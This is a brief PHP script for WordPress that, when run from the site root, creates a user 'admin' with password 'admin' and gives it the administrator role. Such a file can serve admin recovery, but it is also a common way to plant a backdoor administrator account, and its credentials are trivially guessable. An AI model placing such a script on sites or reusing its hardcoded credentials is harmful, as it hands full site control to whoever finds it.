<?php
require('wp-blog-header.php');
$username = 'admin';
$password = 'admin';
$email = 'admin@example.com';
if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo 'User created successfully';
} else {
    echo 'User already exists!';
}
?>
